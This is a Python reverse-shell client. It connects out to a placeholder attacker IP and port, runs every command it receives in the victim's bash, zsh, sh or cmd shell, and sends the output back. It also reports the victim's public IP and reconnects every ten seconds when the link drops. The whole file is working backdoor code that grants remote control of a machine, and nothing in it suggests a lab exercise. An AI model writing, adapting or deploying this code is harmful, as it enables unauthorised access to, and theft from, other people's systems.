import socket
import subprocess
import requests
import sys
import os
import time # Added for sleep in retry logic

DEFAULT_SERVER_IP = "SERVER_IP_PLACEHOLDER"
DEFAULT_SERVER_PORT = SERVER_PORT_PLACEHOLDER

SESSION_SHELL_INFO_SENT = False # Global flag for one-time shell info message

if sys.platform == "win32":
    import ctypes
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd = kernel32.GetConsoleWindow()
else:
    user32 = None
    kernel32 = None
    hwnd = None

def execute_command(command_str):
    global SESSION_SHELL_INFO_SENT
    command_parts = command_str.strip().split()
    output_str = ""
    
    if not command_str.strip():
        return "\n[Empty command received]\n"

    if command_parts[0].lower() == "cd":
        if len(command_parts) > 1:
            target_dir = " ".join(command_parts[1:])
            try:
                os.chdir(target_dir)
                output_str = f"[CWD] {os.getcwd()}\n"
            except FileNotFoundError:
                output_str = f"[Error] cd: No such file or directory: {target_dir}\n"
            except Exception as e:
                output_str = f"[Error] cd: {e}\n"
        else:
            try:
                home_dir = os.path.expanduser('~')
                os.chdir(home_dir)
                output_str = f"[CWD] {os.getcwd()}\n"
            except Exception as e:
                output_str = f"[Error] cd to home: {e}\n"
        return output_str

    shells_to_try = []
    if sys.platform != "win32":
        user_shell_env = os.environ.get("SHELL")
        if user_shell_env and os.path.basename(user_shell_env) in ["bash", "zsh", "fish", "ksh"]:
            shells_to_try.append(user_shell_env)
        shells_to_try.extend(["/bin/bash", "/bin/zsh", "/bin/sh"])
        
        unique_shells = []
        for shell in shells_to_try:
            if shell not in unique_shells:
                unique_shells.append(shell)
        shells_to_try = unique_shells
    else:
        shells_to_try.append(None)

    executed_successfully = False
    shell_info_message_to_prepend = ""

    for shell_path_or_true in shells_to_try:
        current_run_output = "" # Output for this specific shell attempt
        try:
            if sys.platform == "win32":
                args = command_str
                use_shell_param = True
            elif shell_path_or_true:
                args = [shell_path_or_true, "-c", command_str]
                use_shell_param = False
            else:
                continue

            result = subprocess.run(args, shell=use_shell_param, capture_output=True, text=True, cwd=os.getcwd(), timeout=60)
            
            if result.stdout:
                current_run_output += result.stdout
            if result.stderr:
                current_run_output += f"[STDERR] {result.stderr}"
            
            if not current_run_output.strip() and result.returncode == 0 :
                 current_run_output = "\n" # Send just a newline for OK with no output
            elif result.returncode != 0 and not current_run_output.strip():
                current_run_output = f"\n[Command failed with code {result.returncode} via {shell_path_or_true or 'default shell'}]\n"
            
            if not SESSION_SHELL_INFO_SENT and shell_path_or_true and sys.platform != "win32" and shell_path_or_true != "/bin/sh":
                 shell_info_message_to_prepend = f"[Using shell: {os.path.basename(shell_path_or_true)} for commands]\n"
                 SESSION_SHELL_INFO_SENT = True 
            
            output_str = shell_info_message_to_prepend + current_run_output
            executed_successfully = True
            break

        except subprocess.TimeoutExpired:
            output_str = f"[Error] Command timed out after 60 seconds (tried with {shell_path_or_true or 'default shell'}).\n"
            executed_successfully = True # Still counts as an attempt
            break
        except FileNotFoundError:
            if shell_path_or_true and sys.platform != "win32":
                continue 
            else:
                output_str = f"[Error] Default shell not found or 'cmd.exe' missing.\n"
                break 
        except Exception as e:
            output_str = f"[Error executing with {shell_path_or_true or 'default shell'}] {e}\n"
            break 

    if not executed_successfully and not output_str: # Should ideally be caught by specific errors above
        output_str = "[Error] Command execution failed with all attempted shells.\n"
    
    # If successfully executed but output_str is effectively empty (e.g. only shell info message)
    # and it wasn't an explicit "\n" for OK, ensure we send something.
    # This case is less likely now with "\n" for OK.
    if executed_successfully and not output_str.strip() and output_str != "\n":
        output_str = "\n" # Fallback to newline if it ended up empty after shell info

    return output_str

def start_client(server_ip, server_port):
    global SESSION_SHELL_INFO_SENT # Allow modification by execute_command
    
    while True:
        SESSION_SHELL_INFO_SENT = False # Reset for each new connection attempt
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((server_ip, server_port))
            try:
                initial_cwd = f"[CWD] {os.getcwd()}\n"
                client.sendall(initial_cwd.encode('utf-8', errors='replace'))
            except Exception:
                pass

            while True:
                command = client.recv(4096).decode('utf-8', errors='replace').strip()
                if not command:
                    break
                if command.lower() == "exit":
                    break

                if command.lower() == "getip":
                    try:
                        ip = requests.get("https://api64.ipify.org?format=json", timeout=5).json()["ip"]
                        response_data = f"[IP] {ip}\n"
                    except requests.exceptions.RequestException as e:
                        response_data = f"[Error] Getting IP: {e}\n"
                elif command.lower() == "getwd":
                    try:
                        response_data = f"[CWD] {os.getcwd()}\n"
                    except Exception as e:
                        response_data = f"[Error] getwd: {e}\n"
                else:
                    response_data = execute_command(command)
                
                client.sendall(response_data.encode('utf-8', errors='replace'))
            break 
        except (ConnectionRefusedError, socket.timeout, TimeoutError):
            try:
                time.sleep(10)
            except: pass
        except Exception as e:
            try:
                 time.sleep(10)
            except: pass
        finally:
            if 'client' in locals() and hasattr(client, 'fileno') and client.fileno() != -1:
                client.close()

if __name__ == "__main__":
    try:
        port = int(DEFAULT_SERVER_PORT)
    except ValueError:
        sys.exit(1)
    start_client(DEFAULT_SERVER_IP, port)

